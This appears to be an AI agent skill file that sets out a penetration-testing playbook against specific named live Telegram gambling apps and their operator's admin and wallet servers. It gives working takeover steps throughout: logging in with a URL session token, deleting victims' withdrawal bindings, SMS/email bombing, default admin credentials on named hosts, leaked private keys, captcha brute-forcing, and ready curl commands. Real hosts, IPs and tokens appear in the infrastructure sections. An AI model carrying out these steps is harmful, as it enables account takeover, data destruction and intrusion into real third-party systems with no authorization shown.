---
name: 商心慈·六六
description: "666Bet/JVIP TMA渗透: suid直登(session凭据=密码) + 智能跳转页 + 提现绑定无校验删除."
version: 1.0.0
license: MIT
platforms: [linux, macos, windows]
metadata:
    tags: [pentest, tma, telegram, gambling, suid, 666bet]
    category: daaixianzun
---

> **商心慈**
> 心慈不是心手软，账清才能走得远。
> 千门白标同一宗，认族先问商家钱。

# 666Bet / JVIP Telegram Gambling TMA Pentest

Use when the target is the **666Bet family of Telegram gambling Mini Apps** — JVIP (j.vip / jvip1-9.com), 666Bet (iszhk.com infra), or any TMA whose frontend bundle contains `baseUrl=game10.mzbxdt.com` / `PID=10` / JWT `iss=666BetGame`. Also use as the reference for the **suid-direct-login account-takeover class** (any TMA with `POST /login-tg {suid}`) and **smart-redirect landing pages** (`title="Security"` + `config.json` domain array + `?suid=`).

Sibling family skills: Qzino → `telegram-gambling-tma-pentest`, Wali → `wali-tg-tma-pentest`, yudao → `telegram-gambling-yudao-pentest`.

## 1. Fingerprint chain
- Landing `j.vip`: Cloudflare SEA, `<title>Security</title>`, `./static/index.js` + `config.json` — **smart-redirect page**, NOT the app
- Real frontend `jvip1.com`: uni-app/Vue SPA, loads `telegram-web-app.js` + `telegram-widget.js`, `<title>JVIP</title>`, 39 JS chunks under `/static/js/`
- API gateway: `game10.mzbxdt.com` (CloudFront); alt `www.iszhk.com:8443/p{pid}` (often 502)
- WSS: `play.mzbxdt.com:443` (libhv/1.3.4, cmd protocol: 1/2 heartbeat, 51/52 logout)
- Brand constants in bundle (`static/js/index~5c551db8.*.js`): `h=1` → baseUrl `game10.mzbxdt.com`; `C=10` default platformId; AreaCode=86
- JWT: HS256, `iss=666BetGame`, payload `{exp, iat, iss, uid}`
- FOFA: `domain="mzbxdt.com"` (game*/play), `domain="iszhk.com"` (26 hosts: www/mail/oss/pay/im/agent/chat)

## 2. Smart-redirect landing recon (reusable for any 博彩跳转页)
1. GET landing → inline JS extracts `suid` from `?suid=` or `#...?suid=`
2. GET `/config.json?t=<ts>` → `{"domains":["https://jvip1.com".."jvip9.com"],"target_path":"/","fallback_timeout":3000}`
3. Probe each domain `/favicon.ico` — **any HTTP response (even 404) counts as alive** (JS `fetch` resolves on 404)
4. Request real frontend with `?suid=` carried → platform SPA

## 3. suid direct login — CRITICAL (check on EVERY TMA family)
- `POST /login-tg {"suid":"<65-char base64url>","pid":10}` → `{"code":0,"data":{userId, username:"tg@...", token:<JWT>, balance, ...}}`
- suid = **48-byte encrypted blob** (base64url). Any valid suid → fresh JWT; **old tokens stay valid** (no single-session kick, multi-token coexists)
- Tampered/empty/short suid → `{"code":29,"message":"Telegram init data is invalid"}`
- **suid is a session credential living in the URL** — leaks via share links/history/logs/referers = full account takeover. This is the #1 finding; report as CRITICAL with the takeover chain.
- `/login-tg-auth {telegramAuth:<raw initData>}` → forged initData rejected (HMAC verified, code 3 "token invalid")
- `/login {username, password, initData}` — real account+password path; `initData` optional
- **Auth header quirk: `Authorization: <raw JWT>` (NO "Bearer " prefix) + `lang: zh` header. Missing lang → code 8 "token invalid"** — this tripped up the first authed requests; always send both.

## 4. Verified vulnerability chain (account takeover, 2026-08)
1. **F-01 CRITICAL** suid → token direct login (above)
2. **F-02 HIGH** `POST /withdraw/bind/delete {id, deviceId, deviceType}` — **no payPwd/2FA check**, token-only → deletes victim's withdrawal binding. Chain: suid → token → delete bindings → victim locked out of withdrawals
3. **F-03 HIGH** `send/phone/code` / `send/email/code` — unauthenticated, no rate limit → SMS/email bomb (any target returns `{"code":0,"message":"succ"}`)
4. **F-04 MEDIUM** 9+ unauth info leaks: `register/param` (reg config/areas/limits), `curreny/client/status`, `tg/customer/config` (CS Telegram accounts), `client/version`, `general/reward`, `rebate/config`, `welcome/packet`, `query/domain/channel` (needs `{"domain":host}`), `spinwheel/cfg` (needs param)
5. **F-05 MEDIUM** `withdraw/bind/query` → plaintext bound TRC20 address + internal binding id

## 5. Response codes (family-wide)
0 succ · 2 password wrong · 3 invalid param · 6 account not found · 8 token invalid · 9 game fail · 10 rate-limited (repeated login-tg — space requests) · 11 余额不足 · 17 no reward · 18 支付密码错误 · 29 initData invalid · 35 IP register limit

## 6. Pitfalls
- Repeated `login-tg` same suid → code 10 rate limit; sleep between calls
- **`withdraw/bind/delete` has no confirmation — testing destroys the victim's binding; tell user to re-bind after F-02 verification**
- login code 2 vs 6 is an **input-format branch** (len≥6 alnum → 2), NOT username enumeration — don't report as enum
- register `sameIpLimit=6`; XFF/X-Real-IP/CF-Connecting-IP do NOT bypass (server uses real IP)
- Business endpoints server-validated (take/* gated by completion, trans-out by payPwd md5 → code 18) — no free money
- No swagger/actuator/api-docs on game10
- API paths extract: `grep -ohE '\$u\.post\("/[^"]+"' js/*.js | sort -u`

## 7. Endpoint map (base https://game10.mzbxdt.com, POST JSON)

### 嘉百 brand (pid=2, verified 2026-08-05)
- Player frontend `jb173.vip` (Cloudflare, uni-app) with `?suid=`; API **`game.mzbxdt.com`** (CloudFront ACL); bot `t.me/jb88666bot`
- Same API surface + JWT issuer as 666Bet. suid login, send/*/code bomb, withdraw/bind/delete all confirmed on pid=2
- **Admin chain (嘉百)**: admin SPA `tgbet9008.net` (Vue3 Vben RuoYi) → API `int.tgbet271.net` = **飞投/RuoYi v3.9.0** ("若依管理系统" swagger); login forces Google Authenticator TOTP (code=Integer, 谷歌验证码不能为空/错误 vs 谷歌验证错误 = user enum), /register closed, all business APIs 401, path-filter bypass failed
- **Druid weak cred `ruoyi/123456` on ALL int.tgbet* admin API hosts** (int.tgbet271/221/331/771.net) → leaks shared DB `172.22.0.4:3888/ftgames` (root, Docker-internal), business schema: cp_user/cp_busi/cp_change/cp_issue (issue=开奖), sys_user has google_key column
- Same-operator tgbet* farm on 154.9.25.34 (Windows: MySQL 3306 public, FTP/RDP/BT 888/8889, SMB/WinRM filtered)

### 嘉百周边系统 (同运营商, 2026-08-05)
- **ht.rrqa888.com** = 人人娱乐操作手册后台 (geshanzsq-blog-admin 开源框架魔改): API 前缀 `/geshanzsq-blog-admin-api`, **geshanzsq/123456 默认口令可登录** (admin 密码已改, 3300+字典未破), 验证码 SpecCaptcha 2min TTL 一次性 → **ddddocr 100% 识别可全自动爆破**; 未授权: /system/dictionary/getAllDictionaryInfo, /doc.html (knife4j), /profile/ 上传目录403
- **ht.crypto777.vip** = 人人支付系统 (Vben+Vite, Host header 可访问 154.9.25.34): **前端 _app.config.js 泄露完整 RSA 私钥** (VITE_GLOB_RSA_PRIVATE_KEY), API=/test-api (同主机, 502宕机); 若依系业务 /system/client (商户)
- **43.134.52.148:7000/7500** (int.tgbet621/622 服务器): Go 服务 + Basic Auth "Restricted" (未破)
- FOFA 指纹: `body="飞投后台管理框架"` = 68台; `int.tgbet*` 14台全 druid ruoyi/123456 + GA锁
- 密码复用链: geshanzsq admin / MySQL 3306 / 7500 BasicAuth 密码相互独立, 均未复用

### 钱包管理系统 (资金总后台, 2026-08-05 发现)
- **154.9.25.34 默认 vhost (任意未绑定Host) = 钱包管理系统** (Vben SPA, 同构建也部署在 admin.fina.icu)
- API: **wallet.fina.icu/prod-api** (43.156.67.243, 腾讯云HK) = 飞投 v3.9.0 **更新版**: GA锁(5次错锁3分钟, "还剩N次机会") + /sys/* /mer/* 无token静默空200 + druid/actuator/swagger全移除 + register关闭
- **RSA 私钥泄露** (VITE_GLOB_RSA_PRIVATE_KEY 完整PEM, 与 ht.crypto777.vip 同一对密钥); ENABLE_ENCRYPT=false (当前未用)
- 用户: admin + sysadmin (均GA); "登录账号不存在" vs GA错误 = 账号枚举 (检查在GA前)
- 全量业务API图 (282端点): /sys/cp/user/* (list/users/detail/dodraw/backDeposit/paysuc/setPwd/**setGoogleKey**/resetPwd/resetaddr/setFreeTxCount), /sys/cp/withdraw/* (auditList), /sys/cp/transfer/retryCallback, /sys/cp/redpack/refund, /sys/cp/subWallet/*, /sys/cp/flashExchange/*, /sys/cp/key/*, /sys/merchant/*, /mer/cp/com/* (dodraw/depositmoney/transferMoneys/setdrawpwd), /sys/ls/* (eSIM卡订单), /sys/ebd/* (地址/收款), /ptpz/*, /withdrawalReview
- fina.icu root=47.79.64.242(403空壳), 历史 admin.fina.icu=123.206.194.234(已下线)

| path | auth | observed |
|---|---|---|
| /login-tg | suid only | CRITICAL: suid→token direct login |
| /login-tg-auth | telegramAuth | forged initData → code 3/29 (HMAC verified) |
| /login | user+pass+initData | code 2/6 = format branch, not enum |
| /register | verifyCode | code 35 IP limit (sameIpLimit=6) |
| /register/param | none | reg config, areas, limits |
| /curreny/client/status | none | currencies USDT/CNY/USD, rates |
| /tg/customer/config | none | CS Telegram accounts jvip11/22/88… |
| /client/version | none | v1.3.7 |
| /general/reward | none | rebate/daily cashback rates |
| /rebate/config | none | rebate per category |
| /welcome/packet | none | deposit bonus cfg |
| /query/domain/channel | none | needs {"domain":host} |
| /spinwheel/cfg | none | needs param; spinwheel cost list |
| /send/phone/code | none | SMS bomb, no rate limit |
| /send/email/code | none | email bomb, no rate limit |
| /game/chat | token | per-user chatUrl (livechat embed) |
| /user/get/info | token | full profile |
| /task/info | token | task list w/ rewardIds |
| /vip/progress | token | userBet totals |
| /withdraw/channel | token | JLPAY/K钱包/OKPAY/X钱包 |
| /withdraw/bind/query | token | plaintext bound TRC20 + id |
| /withdraw/bind/delete | token | F-02: no payPwd/2FA |
| /withdraw/bind | token | payPwd md5 required |
| /recharge/finished/record | token | order list |
| /recharge/reported | token | {orderList} confirm |
| /refresh-balance | token | balance |
| /signin/info | token | [] |
| /special/activity | token | [] |
| /query-mail | token | {type, lastMailId} |
| /task/reward/record | token | {page,pageSize} |
| /spinwheel/score/record | token | spin history |
| /get/spin-score | token | spinScore |
| /spinwheel | token | {id}; balance-gated (code 11) |
| /take/task/reward | token | {rewardId}; code 17 if not claimable |
| /take/signin/reward | token | {date} |
| /take/special/activity | token | {type} |
| /trans-in | token | {amount*100} |
| /trans-out | token | {amount, payPwd md5}; code 18 wrong pwd |
| /transfer-out-balance | token | balance |
| /enter-tgfun | token | {gameCode}; code 9 fail |
| /forget/pwd | none | {pid,code,phone,password,deviceId,deviceType} |
| /reset-ppwd | token | invalid param |
| /set-language | token | succ |
| /refresh-token | token | token refresh flow |

## 8. Infra inventory (iszhk.com family — GCP HK/JP, NOT CN mainland)
- www.iszhk.com: 666Bet SPA shell (only calls /platform/domain); ports 8443 (API, 502), 4443/8086/88 nginx, 8445/8099 502, 9999 403
- mail.iszhk.com (666Bet mail), oss.wlp.iszhk.com / oss-front.wlp.iszhk.com (34.85.94.30 JP), oss.funwin.iszhk.com (34.92.245.20 HK)
- pay.wlp.iszhk.com, pay.funwin.iszhk.com, im.wlp.iszhk.com (CS SPA), agent.wlp.iszhk.com (agent backend), chat.wlp.iszhk.com
- CS API (im.wlp.iszhk.com): /cs/agent/login, /cs/agent/auto {id,token} (401), /cs/agent/heartbeat, /cs/agent/online-users (GET), /cs/agent/send, /cs/agent/shortcuts, /cs/agent/transfer, /cs/user/connect (needs valid platform), /cs/user/send, /ws — no weak creds hit
- Chat embeds: mes6.uhkrq6y.com token=ec520411a40126d8b029243b01e407f8 (pid 6); webuser.yunq.cc entId=57346c channelId=8150230f05; livechat siteId=65002138 planId=02c6d38f-86e7-4323-8978-aa2358394b2d
- CDN: duqf26jf3ld6q.cloudfront.net (static/images), image.wt29bej.com (p1cny VIP icons)
- mzbxdt.com: game10 (API, CloudFront), game.mzbxdt.com (server acl), game13 (CloudFront), play (WSS libhv)

## 9. Known-good cookie-cutter probe set
```
# unauth leaks
curl -s -X POST https://game10.mzbxdt.com/register/param -H 'Content-Type: application/json' -d '{}'
curl -s -X POST https://game10.mzbxdt.com/tg/customer/config -H 'Content-Type: application/json' -d '{}'
curl -s -X POST https://game10.mzbxdt.com/send/phone/code -H 'Content-Type: application/json' -d '{"phone":"(+86)13900001111","pid":10}'
# auth (NO Bearer, WITH lang)
curl -s -X POST https://game10.mzbxdt.com/user/get/info -H 'Content-Type: application/json' -H "Authorization: $T" -H 'lang: zh' -d '{}'
```
